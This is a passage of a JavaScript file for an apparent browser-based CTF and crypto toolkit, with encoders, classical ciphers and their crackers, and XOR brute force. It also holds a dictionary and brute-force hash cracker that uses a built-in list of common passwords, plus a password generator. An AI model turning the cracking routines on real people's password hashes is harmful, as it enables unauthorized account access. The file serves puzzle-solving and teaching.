  const bytes = new Uint8Array(buf);
  let binary = '';
  for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
  setOutText('base64Output', btoa(binary));
  toast('Encoded ' + f.name);
}
function base64DownloadDecoded() {
  const v = document.getElementById('base64Output').textContent.trim();
  try {
    const bin = atob(v);
    const bytes = new Uint8Array(bin.length);
    for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
    downloadBlob('decoded.bin', bytes);
  } catch (e) { toast('Output is not valid Base64', 'err'); }
}

function urlEncodeTool() { setOutText('urlOutput', encodeURIComponent(document.getElementById('urlInput').value)); }
function urlDecodeTool() {
  try { setOutText('urlOutput', decodeURIComponent(document.getElementById('urlInput').value)); }
  catch (e) { setOutText('urlOutput', 'Error: ' + e.message); }
}

function textToHexTool() {
  const v = document.getElementById('hexInput').value;
  const bytes = new TextEncoder().encode(v);
  setOutText('hexOutput', bytesToHex(bytes));
}
function hexToTextTool() {
  const v = document.getElementById('hexInput').value;
  try {
    const bytes = hexToBytesArr(v);
    setOutText('hexOutput', new TextDecoder('utf-8', { fatal: false }).decode(bytes));
  } catch (e) { setOutText('hexOutput', 'Error: ' + e.message); }
}
function hexToBytesTool() {
  const bytes = hexToBytesArr(document.getElementById('hexInput').value);
  setOutText('hexOutput', Array.from(bytes).join(' '));
}

function textToAsciiTool() {
  const v = document.getElementById('asciiInput').value;
  setOutText('asciiOutput', Array.from(v).map(function (c) { return c.codePointAt(0); }).join(' '));
}
function asciiToTextTool() {
  const v = document.getElementById('asciiInput').value.trim();
  try {
    const codes = v.split(/[\s,]+/).filter(Boolean).map(Number);
    setOutText('asciiOutput', codes.map(function (c) { return String.fromCodePoint(c); }).join(''));
  } catch (e) { setOutText('asciiOutput', 'Error: ' + e.message); }
}

function textToBinaryTool() {
  const v = document.getElementById('binaryInput').value;
  const bytes = new TextEncoder().encode(v);
  setOutText('binaryOutput', Array.from(bytes).map(function (b) { return b.toString(2).padStart(8, '0'); }).join(' '));
}
function binaryToTextTool() {
  const v = document.getElementById('binaryInput').value.replace(/[^01\s]/g, '').trim();
  try {
    const groups = v.split(/\s+/).filter(Boolean);
    let bits = groups.length > 1 ? groups : (v.match(/.{1,8}/g) || []);
    const bytes = bits.map(function (b) { return parseInt(b, 2); });
    setOutText('binaryOutput', new TextDecoder().decode(new Uint8Array(bytes)));
  } catch (e) { setOutText('binaryOutput', 'Error: ' + e.message); }
}
function decimalToBinaryTool() {
  const v = document.getElementById('binaryInput').value.trim();
  const n = Number(v);
  setOutText('binaryOutput', Number.isFinite(n) ? n.toString(2) : 'Enter a decimal number for this mode');
}

/* ---------------------------------------------------------------------- */
/* Base32 / Base58 / Base85                                               */
/* ---------------------------------------------------------------------- */
const B32_ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567';
const B58_ALPHA = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';

function base32Encode(bytes) {
  let bits = '', out = '';
  for (let i = 0; i < bytes.length; i++) bits += bytes[i].toString(2).padStart(8, '0');
  for (let i = 0; i < bits.length; i += 5) {
    const chunk = bits.substr(i, 5).padEnd(5, '0');
    out += B32_ALPHA[parseInt(chunk, 2)];
  }
  while (out.length % 8 !== 0) out += '=';
  return out;
}
function base32Decode(str) {
  str = str.replace(/=+$/, '').toUpperCase();
  let bits = '';
  for (const ch of str) {
    const idx = B32_ALPHA.indexOf(ch);
    if (idx === -1) continue;
    bits += idx.toString(2).padStart(5, '0');
  }
  const bytes = [];
  for (let i = 0; i + 8 <= bits.length; i += 8) bytes.push(parseInt(bits.substr(i, 8), 2));
  return new Uint8Array(bytes);
}
function base58Encode(bytes) {
  let num = 0n;
  for (let i = 0; i < bytes.length; i++) num = num * 256n + BigInt(bytes[i]);
  let out = '';
  while (num > 0n) { out = B58_ALPHA[Number(num % 58n)] + out; num = num / 58n; }
  let leadZeros = 0;
  for (let i = 0; i < bytes.length && bytes[i] === 0; i++) leadZeros++;
  return B58_ALPHA[0].repeat(leadZeros) + (out || '');
}
function base58Decode(str) {
  let num = 0n;
  for (const ch of str) {
    const idx = B58_ALPHA.indexOf(ch);
    if (idx === -1) throw new Error('Invalid Base58 character: ' + ch);
    num = num * 58n + BigInt(idx);
  }
  const bytes = [];
  while (num > 0n) { bytes.unshift(Number(num % 256n)); num = num / 256n; }
  let leadZeros = 0;
  for (let i = 0; i < str.length && str[i] === B58_ALPHA[0]; i++) leadZeros++;
  return new Uint8Array(new Array(leadZeros).fill(0).concat(bytes));
}
function base85Encode(bytes) {
  let out = '<~';
  for (let i = 0; i < bytes.length; i += 4) {
    const chunk = bytes.slice(i, i + 4);
    const padded = new Uint8Array(4);
    padded.set(chunk);
    let n = (padded[0] << 24 | padded[1] << 16 | padded[2] << 8 | padded[3]) >>> 0;
    if (n === 0 && chunk.length === 4) { out += 'z'; continue; }
    let chars = '';
    for (let j = 0; j < 5; j++) { chars = String.fromCharCode(33 + (n % 85)) + chars; n = Math.floor(n / 85); }
    out += chars.slice(0, chunk.length + 1);
  }
  return out + '~>';
}
function base85Decode(str) {
  str = str.replace(/^<~/, '').replace(/~>$/, '').replace(/\s+/g, '');
  const bytesOut = [];
  let i = 0;
  while (i < str.length) {
    if (str[i] === 'z') { bytesOut.push(0, 0, 0, 0); i++; continue; }
    let group = str.substr(i, 5);
    const padLen = 5 - group.length;
    group = group.padEnd(5, 'u');
    let n = 0;
    for (let j = 0; j < 5; j++) n = n * 85 + (group.charCodeAt(j) - 33);
    const b = [(n >>> 24) & 255, (n >>> 16) & 255, (n >>> 8) & 255, n & 255];
    bytesOut.push(...b.slice(0, 4 - padLen));
    i += 5;
  }
  return new Uint8Array(bytesOut);
}
function basexEncode() {
  const mode = document.getElementById('basexMode').value;
  const bytes = new TextEncoder().encode(document.getElementById('basexInput').value);
  try {
    if (mode === '32') setOutText('basexOutput', base32Encode(bytes));
    else if (mode === '58') setOutText('basexOutput', base58Encode(bytes));
    else setOutText('basexOutput', base85Encode(bytes));
  } catch (e) { setOutText('basexOutput', 'Error: ' + e.message); }
}
function basexDecode() {
  const mode = document.getElementById('basexMode').value;
  const v = document.getElementById('basexInput').value.trim();
  try {
    let bytes;
    if (mode === '32') bytes = base32Decode(v);
    else if (mode === '58') bytes = base58Decode(v);
    else bytes = base85Decode(v);
    setOutText('basexOutput', new TextDecoder('utf-8', { fatal: false }).decode(bytes));
  } catch (e) { setOutText('basexOutput', 'Error: ' + e.message); }
}

/* ---------------------------------------------------------------------- */
/* Classical ciphers                                                      */
/* ---------------------------------------------------------------------- */
function caesarShift(text, shift) {
  shift = ((shift % 26) + 26) % 26;
  return text.replace(/[a-zA-Z]/g, function (c) {
    const base = c <= 'Z' ? 65 : 97;
    return String.fromCharCode((c.charCodeAt(0) - base + shift) % 26 + base);
  });
}
function caesarEncryptTool() {
  setOutText('caesarOutput', caesarShift(document.getElementById('caesarInput').value, Number(document.getElementById('caesarShift').value)));
}
function caesarDecryptTool() {
  setOutText('caesarOutput', caesarShift(document.getElementById('caesarInput').value, -Number(document.getElementById('caesarShift').value)));
}
function caesarBruteTool() {
  const text = document.getElementById('caesarInput').value;
  let out = '';
  for (let s = 0; s < 26; s++) out += 'shift ' + String(s).padStart(2, '0') + ':  ' + caesarShift(text, s) + '\n';
  setOutText('caesarOutput', out.trim());
}

function vigenereTransform(text, key, decrypt) {
  key = key.replace(/[^a-zA-Z]/g, '');
  if (!key) return text;
  let ki = 0, out = '';
  for (const ch of text) {
    if (/[a-zA-Z]/.test(ch)) {
      const base = ch <= 'Z' ? 65 : 97;
      const k = key[ki % key.length].toUpperCase().charCodeAt(0) - 65;
      const shift = decrypt ? -k : k;
      out += String.fromCharCode((ch.charCodeAt(0) - base + shift + 26) % 26 + base);
      ki++;
    } else out += ch;
  }
  return out;
}
function vigenereEncryptTool() {
  setOutText('vigenereOutput', vigenereTransform(document.getElementById('vigenereInput').value, document.getElementById('vigenereKey').value, false));
}
function vigenereDecryptTool() {
  setOutText('vigenereOutput', vigenereTransform(document.getElementById('vigenereInput').value, document.getElementById('vigenereKey').value, true));
}

const ENGLISH_FREQ = { A: .0817, B: .0150, C: .0278, D: .0425, E: .1270, F: .0223, G: .0202, H: .0609, I: .0697, J: .0015, K: .0077, L: .0403, M: .0241, N: .0675, O: .0751, P: .0193, Q: .0010, R: .0599, S: .0633, T: .0906, U: .0276, V: .0098, W: .0236, X: .0015, Y: .0197, Z: .0007 };

function chiSquared(text) {
  const letters = text.toUpperCase().replace(/[^A-Z]/g, '');
  if (!letters.length) return Infinity;
  const counts = {};
  for (const c of letters) counts[c] = (counts[c] || 0) + 1;
  let chi = 0;
  for (const L in ENGLISH_FREQ) {
    const observed = counts[L] || 0;
    const expected = ENGLISH_FREQ[L] * letters.length;
    chi += Math.pow(observed - expected, 2) / expected;
  }
  return chi;
}

function vigenereCrackTool() {
  const cipher = document.getElementById('vcrackInput').value;
  const maxLen = Math.max(2, Math.min(20, Number(document.getElementById('vcrackMaxLen').value) || 12));
  const letters = cipher.toUpperCase().replace(/[^A-Z]/g, '');
  if (letters.length < 20) { setOutText('vcrackOutput', 'Need at least ~20 letters of ciphertext for a reliable guess.'); return; }

  // Try each key length, split into columns, find best Caesar shift per column via chi-squared.
  let best = { len: 0, score: Infinity, key: '' };
  for (let len = 1; len <= maxLen; len++) {
    let keyGuess = '';
    let totalChi = 0;
    for (let col = 0; col < len; col++) {
      let colText = '';
      for (let i = col; i < letters.length; i += len) colText += letters[i];
      let bestShift = 0, bestChi = Infinity;
      for (let s = 0; s < 26; s++) {
        const shifted = caesarShift(colText, -s);
        const c = chiSquared(shifted);
        if (c < bestChi) { bestChi = c; bestShift = s; }
      }
      keyGuess += String.fromCharCode(65 + bestShift);
      totalChi += bestChi;
    }
    const avgChi = totalChi / len;
    if (avgChi < best.score) best = { len: len, score: avgChi, key: keyGuess };
  }
  const plain = vigenereTransform(cipher, best.key, true);
  setOutText('vcrackOutput',
    'Best guess — key length ' + best.len + ', key "' + best.key + '" (χ² score ' + best.score.toFixed(1) + ', lower is better)\n\n' + plain +
    '\n\nTip: if this doesn\'t look right, the real key length is often a small multiple/divisor of the one shown — try adjusting "max key length" or checking the plaintext for a shorter repeating pattern.');
}

function atbashTool() {
  const v = document.getElementById('atbashInput').value;
  const out = v.replace(/[a-zA-Z]/g, function (c) {
    const base = c <= 'Z' ? 65 : 97;
    return String.fromCharCode(base + (25 - (c.charCodeAt(0) - base)));
  });
  setOutText('atbashOutput', out);
}
function rot13Tool() { setOutText('rot13Output', caesarShift(document.getElementById('rot13Input').value, 13)); }

function railFenceEncrypt(text, rails) {
  const fence = Array.from({ length: rails }, function () { return []; });
  let rail = 0, dir = 1;
  for (const ch of text) {
    fence[rail].push(ch);
    rail += dir;
    if (rail === rails - 1 || rail === 0) dir *= -1;
  }
  return fence.map(function (r) { return r.join(''); }).join('');
}
function railFenceDecrypt(text, rails) {
  // Iterate by code point, matching railFenceEncrypt's `for (const ch of text)` — iterating by raw
  // UTF-16 code unit (text.length / text[i]) instead split surrogate pairs (e.g. emoji) across two
  // "characters" assigned to different rails, corrupting any non-BMP input on decrypt.
  const chars = Array.from(text);
  const len = chars.length;
  const pattern = [];
  let rail = 0, dir = 1;
  for (let i = 0; i < len; i++) {
    pattern.push(rail);
    rail += dir;
    if (rail === rails - 1 || rail === 0) dir *= -1;
  }
  const out = new Array(len);
  let pos = 0;
  for (let r = 0; r < rails; r++) {
    for (let i = 0; i < len; i++) {
      if (pattern[i] === r) out[i] = chars[pos++];
    }
  }
  return out.join('');
}
function railEncryptTool() { setOutText('railOutput', railFenceEncrypt(document.getElementById('railInput').value, Math.max(2, Number(document.getElementById('railCount').value)))); }
function railDecryptTool() { setOutText('railOutput', railFenceDecrypt(document.getElementById('railInput').value, Math.max(2, Number(document.getElementById('railCount').value)))); }

function gcd(a, b) { return b === 0 ? a : gcd(b, a % b); }
function modInverse(a, m) {
  a = ((a % m) + m) % m;
  for (let x = 1; x < m; x++) if ((a * x) % m === 1) return x;
  return -1;
}
function affineEncrypt(text, a, b) {
  return text.replace(/[a-zA-Z]/g, function (c) {
    const base = c <= 'Z' ? 65 : 97;
    const x = c.charCodeAt(0) - base;
    return String.fromCharCode(((a * x + b) % 26 + 26) % 26 + base);
  });
}
function affineDecrypt(text, a, b) {
  const aInv = modInverse(a, 26);
  if (aInv === -1) return 'Error: a=' + a + ' has no modular inverse mod 26 — pick a coprime with 26 (1,3,5,7,9,11,15,17,19,21,23,25).';
  return text.replace(/[a-zA-Z]/g, function (c) {
    const base = c <= 'Z' ? 65 : 97;
    const y = c.charCodeAt(0) - base;
    return String.fromCharCode((aInv * (y - b + 26 * 26)) % 26 + base);
  });
}
function affineEncryptTool() {
  setOutText('affineOutput', affineEncrypt(document.getElementById('affineInput').value, Number(document.getElementById('affineA').value), Number(document.getElementById('affineB').value)));
}
function affineDecryptTool() {
  setOutText('affineOutput', affineDecrypt(document.getElementById('affineInput').value, Number(document.getElementById('affineA').value), Number(document.getElementById('affineB').value)));
}
function affineBruteTool() {
  const text = document.getElementById('affineInput').value;
  const valid = [1, 3, 5, 7, 9, 11, 15, 17, 19, 21, 23, 25];
  let out = '';
  for (const a of valid) for (let b = 0; b < 26; b++) out += 'a=' + a + ' b=' + b + ':  ' + affineDecrypt(text, a, b) + '\n';
  setOutText('affineOutput', out.trim());
}

function substitutionAnalyzeTool() {
  const text = document.getElementById('subInput').value.toUpperCase();
  const letters = text.replace(/[^A-Z]/g, '');
  const counts = {};
  for (const c of letters) counts[c] = (counts[c] || 0) + 1;
  const sorted = Object.keys(counts).sort(function (a, b) { return counts[b] - counts[a]; });
  const engSorted = Object.keys(ENGLISH_FREQ).sort(function (a, b) { return ENGLISH_FREQ[b] - ENGLISH_FREQ[a]; });
  let rows = '<table class="kv-table">';
  sorted.forEach(function (c, i) {
    const pct = (counts[c] / letters.length * 100).toFixed(1);
    rows += '<tr><td>' + c + '</td><td>' + counts[c] + ' (' + pct + '%)</td><td style="color:var(--teal)">likely ≈ ' + (engSorted[i] || '?') + '</td></tr>';
  });
  rows += '</table>';
  setOut('subFreqOutput', rows + '<div class="hint">Ranking by frequency only — English isn\'t perfectly uniform, so use this as a starting guess, confirm with short/common words (THE, AND, a lone "I" or "A").</div>');
}
function substitutionApplyTool() {
  const text = document.getElementById('subInput').value;
  const key = document.getElementById('subKey').value.toUpperCase().padEnd(26, ' ');
  const out = text.replace(/[a-zA-Z]/g, function (c) {
    const isUpper = c === c.toUpperCase();
    const idx = c.toUpperCase().charCodeAt(0) - 65;
    const mapped = key[idx] && key[idx] !== ' ' ? key[idx] : '_';
    return isUpper ? mapped : mapped.toLowerCase();
  });
  setOutText('subOutput', out);
}

function xorBytes(bytes, keyBytes) {
  const out = new Uint8Array(bytes.length);
  for (let i = 0; i < bytes.length; i++) out[i] = bytes[i] ^ keyBytes[i % keyBytes.length];
  return out;
}
function printableScore(bytes) {
  let score = 0;
  for (let i = 0; i < bytes.length; i++) {
    const b = bytes[i];
    if (b === 32) score += 2;
    else if (b >= 97 && b <= 122) score += 2;
    else if (b >= 65 && b <= 90) score += 1.3;
    else if (b >= 48 && b <= 57) score += 0.8;
    // underscore, braces and a couple of other flag-shape punctuation marks are
    // extremely common in CTF plaintext (flag{...}, ctf_2024, snake_case) — score
    // them like letters rather than as generic noise, or a correct flag loses to
    // coincidental all-lowercase garbage of the same length.
    else if (b === 0x5f || b === 0x7b || b === 0x7d) score += 1.6;
    else if (b >= 33 && b <= 126) score += 0.3;
    else score -= 2;
  }
  let s = score / (bytes.length || 1);
  const text = bytesToAsciiPreview(bytes);
  if (/flag\{[^}]*\}/i.test(text) || /ctf\{[^}]*\}/i.test(text)) s += 5; // unmistakable — force it to the top
  return s;
}
function xorApplyTool() {
  const hex = document.getElementById('xorInput').value;
  const keyStr = document.getElementById('xorKey').value;
  try {
    const bytes = hexToBytesArr(hex);
    const keyBytes = keyStr ? new TextEncoder().encode(keyStr) : new Uint8Array([0]);
    const result = xorBytes(bytes, keyBytes);
    setOutText('xorOutput', 'Hex:  ' + bytesToHex(result) + '\nText: ' + bytesToAsciiPreview(result));
  } catch (e) { setOutText('xorOutput', 'Error: ' + e.message); }
}
function xorBruteTool() {
  const hex = document.getElementById('xorInput').value;
  try {
    const bytes = hexToBytesArr(hex);
    const scored = [];
    for (let k = 0; k < 256; k++) {
      const result = xorBytes(bytes, new Uint8Array([k]));
      scored.push({ k: k, score: printableScore(result), text: bytesToAsciiPreview(result) });
    }
    scored.sort(function (a, b) { return b.score - a.score; });
    const top = scored.slice(0, 10);
    setOutText('xorOutput', top.map(function (r) {
      return 'key 0x' + r.k.toString(16).padStart(2, '0') + '  score ' + r.score.toFixed(2) + '  →  ' + r.text;
    }).join('\n'));
  } catch (e) { setOutText('xorOutput', 'Error: ' + e.message); }
}

const MORSE_MAP = { A: '.-', B: '-...', C: '-.-.', D: '-..', E: '.', F: '..-.', G: '--.', H: '....', I: '..', J: '.---', K: '-.-', L: '.-..', M: '--', N: '-.', O: '---', P: '.--.', Q: '--.-', R: '.-.', S: '...', T: '-', U: '..-', V: '...-', W: '.--', X: '-..-', Y: '-.--', Z: '--..', 0: '-----', 1: '.----', 2: '..---', 3: '...--', 4: '....-', 5: '.....', 6: '-....', 7: '--...', 8: '---..', 9: '----.', '.': '.-.-.-', ',': '--..--', '?': '..--..', "'": '.----.', '!': '-.-.--', '/': '-..-.', '(': '-.--.', ')': '-.--.-', '&': '.-...', ':': '---...', ';': '-.-.-.', '=': '-...-', '+': '.-.-.', '-': '-....-', '_': '..--.-', '"': '.-..-.', '$': '...-..-', '@': '.--.-.' };
const MORSE_REV = Object.fromEntries(Object.entries(MORSE_MAP).map(function (p) { return [p[1], p[0]]; }));
function textToMorseTool() {
  const v = document.getElementById('morseInput').value.toUpperCase();
  const out = v.split('').map(function (c) {
    if (c === ' ') return '/';
    return MORSE_MAP[c] || '';
  }).filter(Boolean).join(' ');
  setOutText('morseOutput', out);
}
function morseToTextTool() {
  const v = document.getElementById('morseInput').value.trim();
  const words = v.split('/');
  const out = words.map(function (w) {
    return w.trim().split(/\s+/).map(function (code) { return MORSE_REV[code] || ''; }).join('');
  }).join(' ');
  setOutText('morseOutput', out);
}

const BACON_MAP = {};
(function () {
  const alpha = 'ABCDEFGHIKLMNOPQRSTUWXYZ'; // classic 24-letter Baconian (I/J, U/V combined)
  for (let i = 0; i < alpha.length; i++) BACON_MAP[alpha[i]] = i.toString(2).padStart(5, '0').replace(/0/g, 'A').replace(/1/g, 'B');
})();
const BACON_REV = Object.fromEntries(Object.entries(BACON_MAP).map(function (p) { return [p[1], p[0]]; }));
function textToBaconTool() {
  const v = document.getElementById('baconInput').value.toUpperCase().replace(/[^A-Z]/g, '');
  const out = v.split('').map(function (c) {
    const norm = c === 'J' ? 'I' : c === 'V' ? 'U' : c;
    return BACON_MAP[norm] || '';
  }).join(' ');
  setOutText('baconOutput', out);
}
function baconToTextTool() {
  const v = document.getElementById('baconInput').value.toUpperCase().replace(/[^AB]/g, ' ');
  const groups = v.trim().split(/\s+/);
  const out = groups.map(function (g) { return BACON_REV[g] || ''; }).join('');
  setOutText('baconOutput', out);
}

function freqAnalyzeTool() {
  const text = document.getElementById('freqInput').value;
  const letters = text.toUpperCase().replace(/[^A-Z]/g, '');
  const counts = {};
  for (const c of letters) counts[c] = (counts[c] || 0) + 1;
  const sorted = Object.keys(counts).sort(function (a, b) { return counts[b] - counts[a]; });
  const bigrams = {};
  for (let i = 0; i < letters.length - 1; i++) {
    const bg = letters.slice(i, i + 2);
    bigrams[bg] = (bigrams[bg] || 0) + 1;
  }
  const topBigrams = Object.keys(bigrams).sort(function (a, b) { return bigrams[b] - bigrams[a]; }).slice(0, 8);
  const bytes = new TextEncoder().encode(text);
  const entropy = calcShannonEntropy(bytes);
  let html = '<table class="kv-table">';
  html += '<tr><td>Length</td><td>' + text.length + ' chars (' + letters.length + ' letters)</td></tr>';
  html += '<tr><td>Shannon entropy</td><td>' + entropy.toFixed(3) + ' bits/byte (English prose ≈ 4.0–4.3, random/encrypted ≈ 7.5–8.0)</td></tr>';
  html += '<tr><td>χ² vs. English</td><td>' + chiSquared(text).toFixed(1) + ' (closer to 0 looks more like English)</td></tr>';
  html += '<tr><td>Most common letters</td><td>' + sorted.slice(0, 8).map(function (c) { return c + ':' + counts[c]; }).join('  ') + '</td></tr>';
  html += '<tr><td>Most common bigrams</td><td>' + topBigrams.join('  ') + '</td></tr>';
  html += '</table>';
  setOut('freqOutput', html);
}

/* ---------------------------------------------------------------------- */
/* Hashing                                                                 */
/* ---------------------------------------------------------------------- */
function hashWith(algo, text) {
  switch (algo) {
    case 'MD5': return CryptoJS.MD5(text).toString();
    case 'SHA1': return CryptoJS.SHA1(text).toString();
    case 'SHA256': return CryptoJS.SHA256(text).toString();
    case 'SHA512': return CryptoJS.SHA512(text).toString();
    case 'SHA3': return CryptoJS.SHA3(text, { outputLength: 256 }).toString();
    default: return '';
  }
}
function identifyHashTool() {
  const h = document.getElementById('hashIdInput').value.trim();
  const len = h.length;
  const isHex = /^[0-9a-fA-F]+$/.test(h);
  const candidates = [];
  if (isHex) {
    const byLen = { 32: ['MD5', 'NTLM', 'MD4'], 40: ['SHA-1', 'RIPEMD-160'], 56: ['SHA-224'], 64: ['SHA-256', 'SHA3-256', 'BLAKE2s-256'], 96: ['SHA-384'], 128: ['SHA-512', 'SHA3-512'] };
    if (byLen[len]) candidates.push.apply(candidates, byLen[len]);
  }
  if (/^\$2[aby]?\$/.test(h)) candidates.push('bcrypt');
  if (/^\$1\$/.test(h)) candidates.push('MD5 crypt (Unix)');
  if (/^\$6\$/.test(h)) candidates.push('SHA-512 crypt (Unix)');
  if (/^\$y\$|^\$7\$/.test(h)) candidates.push('yescrypt');
  if (/^[A-Za-z0-9+/]+=*$/.test(h) && len % 4 === 0 && !isHex) candidates.push('Base64-encoded digest (decode first)');
  // Counting dots alone false-positives on bcrypt/crypt hashes, which routinely contain exactly two
  // '.' characters in their own alphabet — actually validate that part 1 is base64url JSON with a
  // JWT-shaped header (alg/typ) before calling it a JWT.
  (function () {
    const parts = h.split('.');
    if (parts.length !== 3 || parts.some(function (p) { return !p || !/^[A-Za-z0-9_-]+$/.test(p); })) return;
    try {
      const header = JSON.parse(b64urlDecodeStr(parts[0]));
      if (header && typeof header === 'object' && ('alg' in header || 'typ' in header)) candidates.push('JWT (use the JWT Decoder)');
    } catch (e) { /* not valid base64url JSON — not a JWT */ }
  })();
  let html = '<table class="kv-table"><tr><td>Length</td><td>' + len + ' chars</td></tr><tr><td>Charset</td><td>' + (isHex ? 'hexadecimal' : 'mixed / non-hex') + '</td></tr></table>';
  html += candidates.length ? '<div class="hint"><strong>Likely:</strong> ' + candidates.join(', ') + '</div>' : '<div class="hint warn">No confident match — the length/charset don\'t fit a common algorithm cleanly.</div>';
  setOut('hashIdOutput', html);
}
function hashGenTool() {
  const v = document.getElementById('hashGenInput').value;
  const algos = ['MD5', 'SHA1', 'SHA256', 'SHA512', 'SHA3'];
  const labels = { MD5: 'MD5', SHA1: 'SHA-1', SHA256: 'SHA-256', SHA512: 'SHA-512', SHA3: 'SHA3-256' };
  let html = '<table class="kv-table">';
  algos.forEach(function (a) { html += '<tr><td>' + labels[a] + '</td><td>' + hashWith(a, v) + '</td></tr>'; });
  html += '</table>';
  setOut('hashGenOutput', html);
}

const COMMON_PASSWORDS = ['123456', 'password', '123456789', '12345678', '12345', 'qwerty', '1234567', '111111', '1234567890', '123123', 'abc123', 'password1', '1234', 'iloveyou', '000000', 'admin', 'letmein', 'welcome', 'monkey', 'login', 'princess', 'qwertyuiop', 'solo', 'passw0rd', 'starwars', 'dragon', 'football', 'baseball', 'master', 'superman', 'trustno1', 'flag', 'ctf', 'hacker', 'shadow', 'sunshine', 'michael', 'charlie', 'jordan', 'hunter2', 'letmein1', 'changeme', 'secret', 'root', 'toor', 'test', 'guest', 'default', 'pass', 'pass123'];

function hashCrackDictTool() {
  const target = document.getElementById('crackHash').value.trim().toLowerCase();
  const algo = document.getElementById('crackAlgo').value;
  const customList = document.getElementById('crackWordlist').value.split('\n').map(function (s) { return s.trim(); }).filter(Boolean);
  const list = customList.length ? customList : COMMON_PASSWORDS;
  if (!target) { setOutText('crackOutput', 'Paste a hash first.'); return; }
  for (const word of list) {
    if (hashWith(algo, word).toLowerCase() === target) {
      setOutText('crackOutput', 'Match found — "' + word + '"  (' + list.length + ' candidates tried)');
      return;
    }
  }
  setOutText('crackOutput', 'No match in ' + list.length + ' candidates. Try pasting a bigger wordlist, or use brute force for short passwords.');
}
function hashCrackBruteTool() {
  const target = document.getElementById('crackHash').value.trim().toLowerCase();
  const algo = document.getElementById('crackAlgo').value;
  if (!target) { setOutText('crackOutput', 'Paste a hash first.'); return; }
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  const maxLen = 4;
  const spaceSize = [1, 2, 3, 4].reduce(function (sum, len) { return sum + Math.pow(chars.length, len); }, 0); // 1,727,604 for maxLen=4
  let tried = 0;
  const started = Date.now();
  function* gen(maxLen) {
    for (let len = 1; len <= maxLen; len++) {
      const idx = new Array(len).fill(0);
      while (true) {
        yield idx.map(function (i) { return chars[i]; }).join('');
        let pos = len - 1;
        while (pos >= 0) { idx[pos]++; if (idx[pos] < chars.length) break; idx[pos] = 0; pos--; }
        if (pos < 0) break;
      }
    }
  }
  let timedOut = false;
  for (const cand of gen(maxLen)) {
    tried++;
    if (hashWith(algo, cand).toLowerCase() === target) {
      setOutText('crackOutput', 'Match found — "' + cand + '"  (' + tried.toLocaleString() + ' candidates, ' + (Date.now() - started) + 'ms)');
      return;
    }
    if (tried % 5000 === 0 && Date.now() - started > 4000) { timedOut = true; break; } // keep the UI responsive
  }
  // A 4-second UI-responsiveness cutoff is nowhere near exhausting the full 1-4 char space (~1.7M
  // candidates) in pure-JS hashing speed — reporting that as "no match up to 4 characters" would
  // read as a completed exhaustive negative result when it's actually a partial, inconclusive one.
  if (timedOut) {
    setOutText('crackOutput', 'Stopped after 4s — only tried ' + tried.toLocaleString() + ' of ' + spaceSize.toLocaleString() + ' possible 1-4 character candidates (' + (100 * tried / spaceSize).toFixed(1) + '%). This is NOT an exhaustive result — the password may still be in the untried remainder. For a real exhaustive brute force, use hashcat/john offline.');
  } else {
    setOutText('crackOutput', 'No match in all ' + tried.toLocaleString() + ' lowercase/digit candidates up to ' + maxLen + ' characters — the full space was searched. Longer brute force needs a real cracking tool offline (hashcat/john).');
  }
}
function rainbowLookupTool() {
  const target = document.getElementById('rainbowHash').value.trim().toLowerCase();
  const algo = document.getElementById('rainbowAlgo').value;
  if (!target) { setOutText('rainbowOutput', 'Paste a hash first.'); return; }
  const table = {};
  COMMON_PASSWORDS.forEach(function (p) { table[hashWith(algo, p).toLowerCase()] = p; });
  setOutText('rainbowOutput', table[target] ? 'Match — "' + table[target] + '"' : 'Not in the built-in table of ' + COMMON_PASSWORDS.length + ' common passwords. Try the Hash Cracker with a bigger wordlist.');
}

/* ---------------------------------------------------------------------- */
/* Password generator                                                     */
/* ---------------------------------------------------------------------- */
function randomChar(set) {
  const arr = new Uint32Array(1);
  crypto.getRandomValues(arr);
  return set[arr[0] % set.length];
}
function generateOnePassword(len, upper, lower, num, sym, noAmbig) {
  let set = '';
  if (upper) set += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if (lower) set += 'abcdefghijklmnopqrstuvwxyz';
  if (num) set += '0123456789';
  if (sym) set += '!@#$%^&*()-_=+[]{}';
  if (!set) return '';
  if (noAmbig) set = set.replace(/[0O1lI]/g, '');
  let out = '';
  for (let i = 0; i < len; i++) out += randomChar(set);
  return out;
}
function passwordStrengthScore(pw) {
  if (!pw.length) return 0;
  let score = 0;
  if (pw.length >= 8) score += 20; if (pw.length >= 12) score += 15; if (pw.length >= 16) score += 15;
  if (/[a-z]/.test(pw)) score += 10; if (/[A-Z]/.test(pw)) score += 10;
  if (/[0-9]/.test(pw)) score += 10; if (/[^A-Za-z0-9]/.test(pw)) score += 15;
  const unique = new Set(pw).size;
  score += Math.min(10, unique);
  // Previously the length bonus (up to 50 of 105 raw points) was earned by length alone, so a long
  // repeated string like "aaaaaaaaaaaaaaaa" scored "Strong" — higher than the well-known leaked
  // password "password", which the UI simultaneously flags as a top-50 leak. Scale the whole score
  // by how much of the password is actually unique characters, so repetition can't buy a free pass.
  const diversity = unique / pw.length;
  score = score * (0.4 + 0.6 * diversity);
  // A password that's a direct hit in the common-leak list is weak by definition, however it scores
  // on length/charset — cap it hard so the strength label never contradicts the leak warning.
  if (COMMON_PASSWORDS.includes(pw.toLowerCase())) score = Math.min(score, 20);
  return Math.min(100, Math.round(score));
}
function generatePasswordsTool() {
  const len = Math.max(4, Number(document.getElementById('passLen').value) || 16);
  const count = Math.min(50, Math.max(1, Number(document.getElementById('passCount').value) || 5));
  const upper = document.getElementById('passUpper').checked, lower = document.getElementById('passLower').checked;
  const num = document.getElementById('passNum').checked, sym = document.getElementById('passSym').checked;
  const noAmbig = document.getElementById('passNoAmbig').checked;
  if (!upper && !lower && !num && !sym) { setOutText('passOutput', 'Pick at least one character set.'); return; }
  const list = [];
  for (let i = 0; i < count; i++) list.push(generateOnePassword(len, upper, lower, num, sym, noAmbig));
  setOutText('passOutput', list.join('\n'));
}
function checkPasswordTool() {
  const pw = document.getElementById('passCheck').value;
  if (!pw) { setOutText('passStrengthOutput', ''); return; }
  const score = passwordStrengthScore(pw);
  const label = score < 35 ? 'Weak' : score < 60 ? 'Fair' : score < 80 ? 'Strong' : 'Very strong';
  const cls = score < 35 ? 'bad' : score < 60 ? 'warn' : 'good';
